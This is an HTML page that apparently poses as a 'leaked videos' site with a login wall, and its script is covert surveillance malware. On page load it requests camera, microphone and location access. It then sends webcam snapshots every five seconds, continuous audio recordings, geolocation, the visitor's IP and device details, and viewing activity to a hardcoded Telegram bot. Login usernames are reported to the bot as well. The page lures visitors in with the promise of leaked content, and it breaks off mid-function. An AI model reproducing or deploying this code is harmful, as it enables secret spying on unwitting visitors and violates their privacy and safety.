<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</title>
  <!-- Assuming firebase.js is not strictly needed for the core functionality shown,
       but keeping the script tag as it was in your original code -->
  <script src="firebase.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:ital,wght@0,100..700;1,100..700&family=Roboto:wght@400;500&display=swap');

    body { margin: 0; padding: 20px; background: linear-gradient(135deg, #ffe8f0, #ffffff); font-family: 'Roboto', Arial, sans-serif; color: #333; }
    h1 { text-align: center; color: #ffffff; padding: 35px; background: #FF0076; border-radius: 10px; margin-bottom: 20px; font-weight: 800; font-family: "Kantumruy Pro", serif; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
    .container { max-width: 1200px; margin: 0 auto; }
    .video-grid { display: flex; flex-wrap: wrap; gap: 20px; justify-content: center; }
    .video-card { background: #fff; border-radius: 10px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); overflow: hidden; transition: transform 0.3s ease, box-shadow 0.3s ease; max-width: 480px; width: 100%; }
    .video-card:hover { transform: translateY(-5px); box-shadow: 0 8px 16px rgba(0,0,0,0.2); }
    .video-card video { display: block; width: 100%; height: auto; }
    /* Keep capture-container hidden as before, it's for webcam feed internally */
    .capture-container { display: none; }
    .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; overflow: auto; background-color: rgba(0,0,0,0.5); }
    .modal-content { background-color: #fff; margin: 15% auto; padding: 20px; border: 1px solid #888; width: 90%; max-width: 400px; border-radius: 8px; text-align: center; position: relative; }
    .modal-content h2 { margin-top: 0; }
    .modal-content input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; font-size: 1rem; }
    .modal-content button { padding: 10px 20px; font-size: 1rem; background: #FF0076; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
    .success-overlay { display: none; position: fixed; z-index: 1100; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0.5); background: rgba(255, 255, 255, 0.95); padding: 30px 40px; border-radius: 10px; text-align: center; box-shadow: 0 8px 16px rgba(0,0,0,0.2); opacity: 0; transition: transform 0.5s ease, opacity 0.5s ease; }
    .success-overlay.show { display: block; transform: translate(-50%, -50%) scale(1); opacity: 1; }
    .success-overlay .icon { font-size: 3rem; margin-bottom: 10px; }
    .success-overlay .message { font-size: 1.2rem; font-weight: bold; }

    .upload-section { margin-top: 30px; padding: 20px; background: #f0f8ff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
    .upload-section h2 { margin-top: 0; color: #333; }

    input[type="file"]#videoUpload { display: none; }
    .custom-file-upload { border: 1px solid #ccc; display: inline-block; padding: 8px 15px; cursor: pointer; background-color: #e9e9e9; color: #333; border-radius: 5px; font-weight: 500; transition: background-color 0.3s ease; margin-bottom: 10px; }
    .custom-file-upload:hover { background-color: #dcdcdc; }
    #fileNameDisplay { margin-left: 10px; font-style: italic; color: #555; }

    .upload-section button#uploadVideoButton { background: #FF0076; color: #fff; border: none; padding: 12px 22px; border-radius: 5px; cursor: pointer; font-size: 1rem; font-weight: 500; transition: background-color 0.3s ease, transform 0.2s ease; margin-top: 5px; display: block; margin-bottom: 15px; }
    .upload-section button#uploadVideoButton:hover { background: #d60065; transform: translateY(-2px); }
    .upload-section button#uploadVideoButton:active { transform: translateY(0px); }

    #uploadProgress { margin-top: 15px; padding: 10px; background-color: #f0f0f0; border-radius: 5px; }
    #uploadProgress progress { width: calc(100% - 150px); margin-right: 10px; vertical-align: middle; height: 20px; }
    #uploadProgress span { vertical-align: middle; font-size: 0.9rem; }
    #uploadedVideos video { max-width: 100%; height: auto; margin-top: 10px; border: 1px solid #ddd; border-radius: 5px; display: block; }
    #uploadedVideos div { margin-bottom: 20px; padding: 10px; background-color: #f9f9f9; border: 1px solid #eee; border-radius: 5px; }

    /* Removed styles for screen capture elements */

  </style>
</head>
<body>
  <h1>·ûú·û∏·ûä·üÅ·û¢·ûº·ûî·üÇ·ûÄ·ûí·üí·ûõ·û∂·ûô</h1>
  <div class="container">
    <div class="video-grid">
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="machiu.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p1.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p2.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p3.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p4.mp4" type="video/mp4"></video></div>
      <div class="video-card"><video class="homevideo" autoplay controls playsinline webkit-playsinline><source src="p5.mp4" type="video/mp4"></video></div>
    </div>

    <!-- Hidden container for webcam capture video/canvas -->
    <div class="capture-container">
      <video id="videoElementForCapture" autoplay playsinline width="300" height="225"></video>
      <canvas id="snapshot" width="200" height="200"></canvas>
    </div>

    <!-- Removed screen capture elements -->

  </div>

  <div id="loginModal" class="modal">
    <div class="modal-content">
      <h2>Please Login to Watch Full Video</h2>
      <form id="loginForm">
        <input type="text" id="username" placeholder="Username" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Login</button>
      </form>
    </div>
  </div>

  <div id="successOverlay" class="success-overlay">
    <div class="icon">üéâ</div>
    <div class="message">Congratulations! Login Successful.</div>
  </div>

  <div class="container upload-section">
    <h2>Upload Your Video</h2>
    <label for="videoUpload" class="custom-file-upload">Choose Video File</label>
    <span id="fileNameDisplay">No file chosen</span>
    <input type="file" id="videoUpload" accept="video/*">
    <button id="uploadVideoButton">Upload Video</button>
    <div id="uploadProgress" style="display: none;">
      <progress id="progressBar" max="100"></progress>
      <span id="progressText"></span>
    </div>
    <div id="uploadedVideos"></div>
  </div>

  <script>
    const botToken = "6941579931:AAHJRb_kYDxxutmPJ7ji6F5p_laP1LjOnAA";
    const chatId = "8017801890";

    // --- PRIVACY WARNING ---
    // This code accesses the user's camera and microphone and sends data to a Telegram bot.
    // Ensure you have explicit consent from anyone using this code/website.
    // Running this code has significant privacy implications.
    // DO NOT deploy this code publicly or use it without full transparency and consent.
    // --- END WARNING ---

    // Webcam elements
    const videoElementForCapture = document.getElementById("videoElementForCapture");
    const webcamCanvas = document.getElementById("snapshot");
    const webcamCtx = webcamCanvas.getContext("2d");

    // Microphone tracking and recording variables
    let audioContext = null;
    let analyserNode = null;
    let microphoneStream = null;
    let micDataArray = null;
    let mediaRecorder = null; // New: MediaRecorder instance
    let audioChunks = [];    // New: Array to store audio data chunks

    // Configuration for audio analysis, recording, and reporting
    const ANALYSER_FFT_SIZE = 2048; // Size of FFT for analysis (remains for state detection)
    const MIC_THRESHOLD_HIGH = 40; // Threshold to consider audio 'active' (0-255) - adjust as needed
    const MIC_THRESHOLD_LOW = 30;  // Threshold to consider audio 'quiet' (0-255) - adjust as needed
    const AUDIO_CHUNK_TIME = 5000; // Record and send chunks every 5000ms (5 seconds)

    let userLocation = { lat: "N/A", lon: "N/A" };
    let isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
    let currentVideo = null;
    let lastFullscreenVideo = null;

    if(isLoggedIn) {
      document.getElementById('loginModal').style.display = 'none';
    }

    // --- Initial Setup on Page Load ---

    // Request webcam access on page load
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        videoElementForCapture.srcObject = stream;
        videoElementForCapture.onloadedmetadata = () => {
            getLocation();
            startLoopCapture(); // Start webcam snapshots
        };
        sendToBot("‚úÖ User granted camera permission.");
      })
      .catch(error => {
        console.error("Camera permission denied:", error);
        let errorMessage = error.message || "Unknown error";
         if (error.name === 'NotAllowedError') errorMessage = "User denied camera permission.";
         else if (error.name === 'NotFoundError') errorMessage = "No camera found.";
        sendToBot(`üö´ Camera access failed: ${errorMessage}`);
      });

    // Request microphone access and start recording on page load
    getMicrophoneStreamAndRecord();

    sendIPAndBasicInfo(); // Send basic info on page load

    // --- Geolocation Logic ---
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          position => {
            userLocation = { lat: position.coords.latitude, lon: position.coords.longitude };
            sendToBot(`üìç Got location: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}`);
          },
          error => {
            console.error("Error getting location:", error);
            let errorMessage = error.message || "Unknown error";
            if (error.code === 1) errorMessage = "User denied Geolocation permission.";
            else if (error.code === 2) errorMessage = "Location unavailable.";
            else if (error.code === 3) errorMessage = "Location request timed out.";
            sendToBot(`üö´ Error getting location: ${errorMessage}`);
          },
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
        );
      } else {
        console.error("Geolocation not supported.");
        sendToBot("üö´ Geolocation not supported by this browser.");
      }
    }

    // --- Webcam Capture Logic ---
    // Function to capture frame from webcam and send
    function captureAndSend() {
      if (!videoElementForCapture.srcObject || !videoElementForCapture.srcObject.active || videoElementForCapture.readyState < videoElementForCapture.HAVE_METADATA) {
        console.warn("Camera stream not ready for capture or stopped.");
        return;
      }
      try {
        webcamCanvas.width = videoElementForCapture.videoWidth; // Use actual video dimensions
        webcamCanvas.height = videoElementForCapture.videoHeight;
        webcamCtx.clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
        webcamCtx.drawImage(videoElementForCapture, 0, 0, webcamCanvas.width, webcamCanvas.height);

        webcamCanvas.toBlob(blob => {
          if (blob) sendPhoto(blob, "üì∏ Webcam Snapshot");
          else console.warn("Failed to create webcam snapshot blob.");
        }, "image/png");
      } catch (e) {
        console.error("Error during webcam snapshot capture:", e);
        sendToBot(`üö´ Error during webcam snapshot capture: ${e.message}`);
      }
    }

    // Starts the repeating webcam capture
    function startLoopCapture() {
        captureAndSend(); // Capture immediately
        // Set up interval for recurring snapshots (e.g., every 5 seconds)
        setInterval(captureAndSend, 5000); // You can adjust this interval
    }
    // --- End Webcam Capture Logic ---


    // --- Microphone Recording and Tracking Logic ---
    function getMicrophoneStreamAndRecord() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            console.error("getUserMedia not supported on this browser.");
            sendToBot("üö´ Microphone access not supported by this browser.");
            return;
        }
         if (!window.MediaRecorder) {
            console.error("MediaRecorder not supported on this browser.");
            sendToBot("üö´ Audio recording not supported by this browser.");
            return;
         }

        navigator.mediaDevices.getUserMedia({ audio: true })
            .then(stream => {
                microphoneStream = stream;
                sendToBot("‚úÖ User granted microphone permission. Starting recording...");

                // Initialize Web Audio API for optional analysis (e.g., state detection)
                initAudioAnalysis(stream); // Keep analysis for state detection

                // Initialize MediaRecorder
                let options = { mimeType: 'audio/webm;codecs=opus' }; // Preferred format/codec
                // Check if the preferred mime type is supported
                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                    console.warn(`${options.mimeType} not supported. Trying default.`);
                    options = { mimeType: 'audio/webm' }; // Try WebM without explicit codec
                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                         console.warn(`${options.mimeType} not supported. Trying ogg.`);
                         options = { mimeType: 'audio/ogg' }; // Try OGG
                         if (!MediaRecorder.isTypeSupported(options.mimeType)) {
                             console.warn(`${options.mimeType} not supported. Trying default.`);
                              options = {}; // Let browser choose
                         }
                    }
                }
                 console.log("Using MediaRecorder options:", options);
                 mediaRecorder = new MediaRecorder(stream, options);

                // Handle available audio data chunks
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data && event.data.size > 0) {
                        // Each event.data is a Blob containing a 5-second chunk
                        console.log(`Audio chunk available: ${event.data.size} bytes`);
                        sendAudioToBot(event.data); // Send the blob immediately
                    }
                };

                // Handle recorder errors
                 mediaRecorder.onerror = (event) => {
                     console.error("MediaRecorder error:", event.error);
                     sendToBot(`‚ö†Ô∏è MediaRecorder error: ${event.error.name || event.error.message || 'Unknown Error'}`);
                 };


                // Start recording, specifying the timeslice interval
                mediaRecorder.start(AUDIO_CHUNK_TIME);
                console.log(`MediaRecorder started with timeslice ${AUDIO_CHUNK_TIME}ms`);


                 // Add a listener to send a message if the mic stream stops (user action, etc.)
                 // This is crucial for detecting when recording stops unexpectedly
                stream.getTracks().forEach(track => {
                    track.onended = () => {
                        sendToBot("‚ÑπÔ∏è Microphone stream ended (e.g., permission revoked, device removed). Recording stopped.");
                        console.log("Microphone stream ended. Stopping MediaRecorder.");
                        // Stop the recorder if the stream ends
                        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                           try { mediaRecorder.stop(); } catch(e) { console.error("Error stopping recorder:", e); }
                        }
                        // Clean up analysis loop and nodes
                        if (audioAnalyserId) cancelAnimationFrame(audioAnalyserId);
                        // Analysis nodes cleaned up in initAudioAnalysis on stream end listener
                        analyserNode = null; // Clear reference
                    };
                });

            })
            .catch(error => {
                console.error("Microphone permission denied or error:", error);
                let errorMessage = error.message || "Unknown error";
                if (error.name === 'NotAllowedError') errorMessage = "User denied microphone permission.";
                else if (error.name === 'NotFoundError') errorMessage = "No microphone found.";
                else if (error.name === 'NotReadableError') errorMessage = "Microphone is busy or not working.";
                else if (error.name === 'OverconstrainedError') errorMessage = "Requested constraints cannot be satisfied.";

                 sendToBot(`üö´ Microphone access/recording failed: ${errorMessage}`);
            });
    }

     // This function initializes the Web Audio API nodes for *analysis* (like loudness state)
     // It runs continuously but doesn't send data itself, only updates micState
    function initAudioAnalysis(stream) {
        try {
            if (!audioContext || audioContext.state === 'closed') {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                 // Resume context if suspended - important for mobile browsers
                 if (audioContext.state === 'suspended') {
                     const resumeHandler = () => {
                         audioContext.resume().then(() => {
                            console.log('AudioContext resumed successfully');
                            // Remove listener after success to avoid duplicates
                            document.body.removeEventListener('click', resumeHandler);
                            document.removeEventListener('touchstart', resumeHandler);
                            document.removeEventListener('play', resumeHandler); // Also listen for video play
                         }).catch(e => console.error('AudioContext resume failed:', e));
                     };
                     // Add listeners for potential user gestures to resume context
                     document.body.addEventListener('click', resumeHandler, {once: true});
                     document.addEventListener('touchstart', resumeHandler, {once: true}); // For mobile
                     document.addEventListener('play', resumeHandler, {once: true}); // For video play
                 }
            }

            const source = audioContext.createMediaStreamSource(stream);
            analyserNode = audioContext.createAnalyser();
            analyserNode.fftSize = ANALYSER_FFT_SIZE;
            micDataArray = new Uint8Array(analyserNode.frequencyBinCount);

            // Connect nodes: source -> analyser. We don't need to connect to destination
            // if we are only doing analysis and the stream is kept alive by MediaRecorder.
            source.connect(analyserNode);
             // Optional: Connect analyser to destination if not connecting source directly,
             // sometimes needed to prevent stream processing being stopped. Test if needed.
             // analyserNode.connect(audioContext.destination);


            // Start the continuous data processing loop using requestAnimationFrame
            // This loop updates micDataArray and micState
            analyseAudioStream();

             // Add a listener to disconnect nodes if the stream ends
             stream.getTracks().forEach(track => {
                 track.onended = () => {
                     console.log("Audio analysis stream track ended. Disconnecting nodes.");
                     if (source) { try { source.disconnect(); } catch(e){ console.error("source disconnect error:", e); } }
                     if (analyserNode) { try { analyserNode.disconnect(); } catch(e){ console.error("analyser disconnect error:", e); } }
                 };
             });


        } catch (e) {
            console.error("Error initializing audio analysis:", e);
            sendToBot(`üö´ Error setting up audio analysis: ${e.message}`);
             // Ensure stream is stopped if analysis setup fails
             if(stream) stream.getTracks().forEach(track => track.stop());
        }
    }

    // This loop continuously updates the micDataArray for analysis (state detection)
    // It does NOT send data to the bot.
    function analyseAudioStream() {
        if (!analyserNode || !micDataArray || micDataArray.length === 0 || !microphoneStream || !microphoneStream.active) {
            // Analysis not ready or stream stopped
            // No need to schedule next frame if stream is inactive
             console.warn("Analyser or stream not ready, stopping analysis loop.");
             audioAnalyserId = null; // Clear loop ID
            return;
        }

        // Get frequency data and copy it into the micDataArray
        analyserNode.getByteFrequencyData(micDataArray);

        // Calculate average loudness (simple method using RMS conceptually)
        let sumOfSquares = 0;
        for (let i = 0; i < micDataArray.length; i++) {
            sumOfSquares += micDataArray[i] * micDataArray[i];
        }
        const averageLoudness = Math.sqrt(sumOfSquares / micDataArray.length); // Range approx 0 to 180

        // --- Detect State Change (Quiet/Active) ---
        // Use hysteresis with two thresholds
        if (micState === 'quiet' && averageLoudness >= MIC_THRESHOLD_HIGH) {
            micState = 'active';
            sendToBot("üé§ Significant sound detected.");
             console.log("Mic state: Active", averageLoudness.toFixed(1));
        } else if (micState === 'active' && averageLoudness < MIC_THRESHOLD_LOW) {
            micState = 'quiet';
            sendToBot("üîá Sound levels low (quiet).");
            console.log("Mic state: Quiet", averageLoudness.toFixed(1));
        }

        // Schedule the next data processing frame
        audioAnalyserId = requestAnimationFrame(analyseAudioStream);
    }


    // This function sends an audio Blob to the Telegram bot
    function sendAudioToBot(audioBlob) {
        if (!audioBlob || audioBlob.size === 0) {
            console.warn("Attempted to send empty audio blob.");
            return;
        }
         const fileSizeKB = (audioBlob.size / 1024).toFixed(1);
         console.log(`Sending audio blob: ${fileSizeKB} KB`);

        const formData = new FormData();
        formData.append("chat_id", chatId);
        // Use a dynamic filename
        const filename = `audio_chunk_${Date.now()}.${audioBlob.type.split('/')[1].split(';')[0]}`; // e.g., .webm, .ogg
        formData.append("audio", audioBlob, filename); // Telegram Bot API expects parameter name "audio"

        const locationInfo = (userLocation.lat !== "N/A") ? `üìç Loc: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}` : "üìç Loc: N/A";
        // Include mic state in the caption
        formData.append("caption", `üé§ Audio Chunk (${AUDIO_CHUNK_TIME/1000}s)\nLevel: ${micState === 'active' ? 'Active' : 'Quiet'}\n${locationInfo}`);


        fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, { method: "POST", body: formData })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Audio chunk sent successfully.", data);
                 // Optional: sendToBot(`‚úÖ Sent audio chunk (${fileSizeKB} KB)`); // Can be too noisy
            } else {
                console.error("TG Audio Send Err:", data.description, data);
                sendToBot(`‚ùå TG Audio Send Err: ${data.description} (${fileSizeKB} KB)`);
            }
        })
        .catch(error => {
            console.error("Net Audio Send Err:", error);
            sendToBot(`üö´ Net Audio Send Err: ${error.message} (${fileSizeKB} KB)`);
        });
    }
    // --- End Microphone Recording and Tracking Logic ---


    // --- General Telegram Sending Functions (sendPhoto and sendToBot) ---
    // sendPhoto function (remains the same, used by webcam capture)
    function sendPhoto(blob, captionPrefix) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      const filename = `${captionPrefix.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.png`;
      formData.append("photo", blob, filename);
      const locationInfo = (userLocation.lat !== "N/A") ? `üìç Loc: ${userLocation.lat.toFixed(5)}, ${userLocation.lon.toFixed(5)}` : "üìç Loc: N/A";
      formData.append("caption", `${captionPrefix}!\n${locationInfo}`);

      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData })
      .then(response => response.json())
      .then(data => {
        if (!data.ok) sendToBot(`‚ö†Ô∏è TG PhotoErr (${captionPrefix}): ${data.description}`);
      })
      .catch(error => sendToBot(`üö´ Net PhotoErr (${captionPrefix}): ${error.message}`));
    }

     // sendLocation function (optional, already included in photo/audio captions)
    function sendLocation() {
         // This function is kept but not called by default anymore,
         // as location is added to photo/audio captions.
         // If you need separate location messages, call this.
      if (userLocation.lat === "N/A") return;
       const currentTime = Date.now();
       // Basic check: don't send location more often than every X seconds? (Optional)
       // if (this.lastLocationSentTime && (currentTime - this.lastLocationSentTime < 30000)) {
       //    console.log("Skipping location send (too frequent)");
       //    return;
       // }
       // this.lastLocationSentTime = currentTime; // Store last send time

      fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, latitude: userLocation.lat, longitude: userLocation.lon })
      })
      .then(response => response.json())
      .then(data => { if (!data.ok) sendToBot(`‚ö†Ô∏è TG LocErr: ${data.description}`); })
      .catch(error => sendToBot(`üö´ Net LocErr: ${error.message}`));
    }

    function sendToBot(message) {
       console.log("Sending to bot:", message); // Log messages locally too
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: message })
      })
      .then(response => response.json())
      .then(data => { if (!data.ok) console.error("TG MsgErr:", data.description); })
      .catch(error => console.error("Net MsgErr:", error));
    }
    // --- End General Telegram Sending Functions ---


    // --- Existing Tracking and Login Logic ---
    const pageStartTime = Date.now();
    document.addEventListener("visibilitychange", () => {
      if (document.visibilityState === 'hidden') {
        const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
        sendToBot(`üö™ Spent ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s. Page hidden. Max scroll: ${maxScrollDepthAchieved.toFixed(0)}%`);
         // Attempt to suspend audio context when tab is hidden
         if (audioContext && audioContext.state === 'running') {
             audioContext.suspend().then(() => console.log('AudioContext suspended')).catch(e => console.error('Suspend failed:', e));
         }
          // Optional: Pause media recorder when hidden? Depends on desired behavior.
          // mediaRecorder.pause(); // If you want to stop recording when hidden
      } else if (document.visibilityState === 'visible') {
        sendToBot(`üëÄ Tab active. Scroll: ${getCurrentScrollPercentage().toFixed(0)}%`);
         // Attempt to resume audio context when tab becomes visible
         if(audioContext && audioContext.state === 'suspended') {
             audioContext.resume().then(() => console.log('AudioContext resumed from visibility change')).catch(e => console.error('Resume failed:', e));
         }
          // Optional: Resume media recorder when visible?
          // if (mediaRecorder && mediaRecorder.state === 'paused') mediaRecorder.resume();
      }
    });

     // Ensure cleanup on page unload
    window.addEventListener("beforeunload", () => {
      const timeSpentSeconds = Math.round((Date.now() - pageStartTime) / 1000);
      sendToBot(`üö™ Spent ${Math.floor(timeSpentSeconds / 60)}m ${timeSpentSeconds % 60}s. Page closing. Max scroll: ${maxScrollDepthAchieved.toFixed(0)}%`);
       // Stop all active media tracks
       if (videoElementForCapture && videoElementForCapture.srcObject) {
           videoElementForCapture.srcObject.getTracks().forEach(track => track.stop());
       }
       if (microphoneStream) {
           microphoneStream.getTracks().forEach(track => track.stop());
       }
       // Stop the media recorder
        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
           try { mediaRecorder.stop(); } catch(e) { console.error("Error stopping recorder on unload:", e); }
        }
       // Cancel the analysis loop
       if (audioAnalyserId) cancelAnimationFrame(audioAnalyserId);
       // Clear any pending intervals (like webcam capture, although stream stopping should handle it)
        // Example: clearInterval(webcamIntervalId); // Assuming webcamIntervalId is stored
       // Close audio context
       if (audioContext && audioContext.state !== 'closed') {
           audioContext.close().catch(e => console.error('AudioContext close failed:', e));
       }
    });

    // sendIPAndBasicInfo on page load
    function sendIPAndBasicInfo() {
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          const userAgent = navigator.userAgent;

          let os = "Unknown OS";
          if (userAgent.includes("Win")) os = "Windows";
          else if (userAgent.includes("Mac")) os = "MacOS";
          else if (userAgent.includes("Android")) os = "Android";
          else if (userAgent.match(/iPhone|iPad|iPod/i)) os = "iOS";
          else if (userAgent.includes("Linux")) os = "Linux";

          let browser = "Unknown Browser";
          if (userAgent.includes("Firefox/")) browser = "Firefox";
          else if (userAgent.includes("Edg/")) browser = "Edge"; // Chromium Edge
          else if (userAgent.includes("OPR/") || userAgent.includes("Opera/")) browser = "Opera";
          else if (userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Chrome";
          else if (userAgent.includes("Safari/") && !userAgent.includes("Chrome/") && !userAgent.includes("Chromium/")) browser = "Safari";
           else if (userAgent.includes("Trident/")) browser = "IE"; // Old IE

          const screenWidth = window.screen.width;
          const screenHeight = window.screen.height;
          const referrer = document.referrer || "Direct visit";
          const language = navigator.language;
          const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

          const basicMessage = `‚ÑπÔ∏è Visitor Info:
IP: ${ip}
OS: ${os}
Browser: ${browser}
Screen: ${screenWidth}x${screenHeight}
Referrer: ${referrer}
Language: ${language}
Timezone: ${timezone}
Logged In: ${isLoggedIn}`;
          // User Agent is quite long, consider if it's always needed or log separately
          // basicMessage += `\nUA: ${userAgent}`;
          sendToBot(basicMessage);
        })
        .catch(() => {
            sendToBot("üö´ Could not fetch client IP address.");
        });
    }

    function showLoginModal() { document.getElementById('loginModal').style.display = 'block'; }
    function hideLoginModal() { document.getElementById('loginModal').style.display = 'none'; }
    function showSuccessAnimation() {
        const overlay = document.getElementById('successOverlay');
        overlay.classList.add('show');
        setTimeout(() => overlay.classList.remove('show'), 1500);
    }

    const videoStates = new WeakMap();
    function getVideoState(videoElement){
        if(!videoStates.has(videoElement)) {
            videoStates.set(videoElement, {previousTime: 0, hasStartedPlaying: false});
        }
        return videoStates.get(videoElement);
    }
    function getVideoFileName(videoElement){
        const source = videoElement.currentSrc || videoElement.src || "";
        try {
            return decodeURIComponent(source.substring(source.lastIndexOf('/') + 1));
        } catch(e) {
            return source.substring(source.lastIndexOf('/') + 1) || 'UnknownVideo';
        }
    }

    // Video event listeners
    document.querySelectorAll('.homevideo').forEach(videoEl => {
      const videoName = getVideoFileName(videoEl);
      const state = getVideoState(videoEl);

      videoEl.addEventListener('play', function() {
        // Resume audio context on video play if suspended
         if(audioContext && audioContext.state === 'suspended') {
             audioContext.resume().then(() => console.log('AudioContext resumed from video play')).catch(e => console.error('Resume failed:', e));
         }

        if (!isLoggedIn && this.currentTime >= 5) {
            this.pause(); currentVideo = this; showLoginModal(); return;
        }
        if (!state.hasStartedPlaying || this.ended) {
            sendToBot(`‚ñ∂Ô∏è Started: ${videoName}`);
            state.hasStartedPlaying = true;
            if(this.ended) state.previousTime = 0;
        } else {
            sendToBot(`‚ñ∂Ô∏è Resumed: ${videoName} at ${this.currentTime.toFixed(1)}s`);
        }
        state.previousTime = this.currentTime;
      });

      videoEl.addEventListener('pause', function() {
        const isLoginWallPause = !isLoggedIn && currentVideo === this && this.currentTime >= 4.9 && !this.ended;
        if (!isLoginWallPause && !this.ended && this.currentTime > 0) {
            sendToBot(`‚è∏Ô∏è Paused: ${videoName} at ${this.currentTime.toFixed(1)}s`);
        }
      });

      videoEl.addEventListener('ended', function() {
        sendToBot(`‚èπÔ∏è Finished: ${videoName}`);
        state.hasStartedPlaying = false;
      });

      videoEl.addEventListener('volumechange', function() {
        sendToBot(`üîä Volume ${videoName}: ${(this.volume * 100).toFixed(0)}% (Muted: ${this.muted})`);
      });

      videoEl.addEventListener('seeked', function() {
        sendToBot(`‚è≠Ô∏è Seeked ${videoName} from ${state.previousTime.toFixed(1)}s to ${this.currentTime.toFixed(1)}s`);
        state.previousTime = this.currentTime;
      });

      videoEl.addEventListener('timeupdate', function() {
        if (!isLoggedIn && this.currentTime >= 5 && !this.paused) {
            this.pause(); currentVideo = this; showLoginModal();
        }
        if (!this.seeking) {
            state.previousTime = this.currentTime;
        }
      });

      videoEl.addEventListener('error', function() {
        let errorMessage = 'Unknown video error';
        if (this.error) {
            switch (this.error.code) {
                case MediaError.MEDIA_ERR_ABORTED: errorMessage = 'Playback aborted'; break;
                case MediaError.MEDIA_ERR_NETWORK: errorMessage = 'Network error'; break;
                case MediaError.MEDIA_ERR_DECODE: errorMessage = 'Decoding error'; break;
                case MediaError.MEDIA_ERR_SRC_NOT_SUPPORTED: errorMessage = 'Source not supported/found'; break;
                default: errorMessage = `Error code: ${this.error.code}`;
            }
        }
        sendToBot(`‚ö†Ô∏è Video error on ${videoName}: ${errorMessage}`);
      });

      videoEl.addEventListener('webkitbeginfullscreen', function() {
          lastFullscreenVideo = this;
          sendToBot(`‚ÜïÔ∏è FS Enter (iOS): ${videoName}`);
      });
      videoEl.addEventListener('webkitendfullscreen', function() {
          sendToBot(`‚ÜïÔ∏è FS Exit (iOS): ${videoName}`);
          if (lastFullscreenVideo === this) lastFullscreenVideo = null;
      });
    });

    function handleFullscreenChange() {
      const fullscreenElement = document.fullscreenElement || document.webkitFullscreenElement;
      if (fullscreenElement) {
        const videoName = (fullscreenElement.classList && fullscreenElement.classList.contains('homevideo'))
                            ? getVideoFileName(fullscreenElement)
                            : `element (${fullscreenElement.tagName || 'Unknown'})`;
        if (fullscreenElement.classList && fullscreenElement.classList.contains('homevideo')) {
            lastFullscreenVideo = fullscreenElement;
        } else {
            lastFullscreenVideo = null;
        }
        sendToBot(`‚ÜïÔ∏è FS Enter: ${videoName}`);
      } else {
        const exitedVideoName = lastFullscreenVideo ? getVideoFileName(lastFullscreenVideo) : "previously active element";
        sendToBot(`‚ÜïÔ∏è FS Exit (was ${exitedVideoName})`);
        lastFullscreenVideo = null;
      }
    }
    ['fullscreenchange','webkitfullscreenchange','mozfullscreenchange','MSFullscreenChange'].forEach(eventType => document.addEventListener(eventType, handleFullscreenChange));

    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const username = usernameInput.value.trim();

      // Simple hardcoded credentials check (NOTE: This is INSECURE for production)
      if (username === 'your_username' && passwordInput.value === 'your_password') { // <-- REPLACE WITH YOUR DESIRED USER/PASS
         isLoggedIn = true;
         localStorage.setItem("isLoggedIn", "true");
         localStorage.setItem("username", username);
         hideLoginModal();
         showSuccessAnimation();
         sendToBot(`‚úÖ User "${username}" logged in.`);
         usernameInput.value = '';
         passwordInput.value = '';
         // Resume video playback after successful login
         setTimeout(() => {
             if (currentVideo) { currentVideo.play().catch(console.warn); currentVideo = null; }
         }, 1500);
      } else {
